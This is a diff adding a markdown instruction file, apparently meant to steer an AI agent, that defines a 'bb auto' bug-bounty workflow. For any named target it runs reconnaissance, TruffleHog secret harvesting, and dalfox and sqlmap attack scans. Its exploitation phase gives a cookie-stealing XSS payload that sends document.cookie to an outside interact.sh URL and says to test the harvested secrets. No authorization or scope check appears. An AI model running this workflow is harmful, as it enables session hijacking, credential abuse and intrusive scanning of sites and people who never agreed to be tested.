@@ -1,0 +1,48 @@
+## BB-Auto (Bug Bounty Automation)
+
+When user says "bb auto <target>" or "full hunt <target>":
+
+### Phase 1: Recon
+- `do recon on <target>`
+- `do iprecon on <target>`
+- `give me endpoint for <target>`
+- `analyze bypasses and build wordlist for <target>`
+
+### Phase 2: Secret Scanning with TruffleHog
+```bash
+mkdir -p <target>_secrets
+# Scan URLs for secrets
+cat <target>_recon/httpx.txt | trufflehog http --concurrency=10 --json > <target>_secrets/http_secrets.json
+
+# Scan GitHub org (public)
+trufflehog github --org=<target> --json > <target>_secrets/github_secrets.json
+
+# Scan filesystem (JS files)
+trufflehog filesystem <target>_jsrecon/ --json > <target>_secrets/js_secrets.json
+
+# Extract verified secrets only
+jq 'select(.Verified == true)' <target>_secrets/*.json > verified_secrets.txt
+```
+
+### Phase 3: Scanning
+- **XSS**: `dalfox file <target>_endpoints/endpoints_wordlist.txt --only-poc -o xss.txt`
+- **Redirect**: `redirfinder` workflow on params
+- **SQLi**: `sqlmap -m httpx.txt --batch --smart --level=1 --time-sec=2`
+
+### Phase 4: Exploitation
+- **XSS PoC**: `<script>fetch('https://interact.sh/steal?cookie='+document.cookie)</script>`
+- **Test verified secrets** from TruffleHog
+
+### Quick Commands
+- `bb quick <target>` = Phase 1 only (5 min)
+- `bb full <target>` = All phases (20 min)
+- `bb secrets <target>` = Phase 2 only (TruffleHog deep scan)
+
+---
+
+Ensure tools are installed:
+```bash
+for tool in trufflehog jq dalfox subfinder httpx katana sqlmap git; do
+  command -v $tool || echo "Missing: $tool"
+done
+```
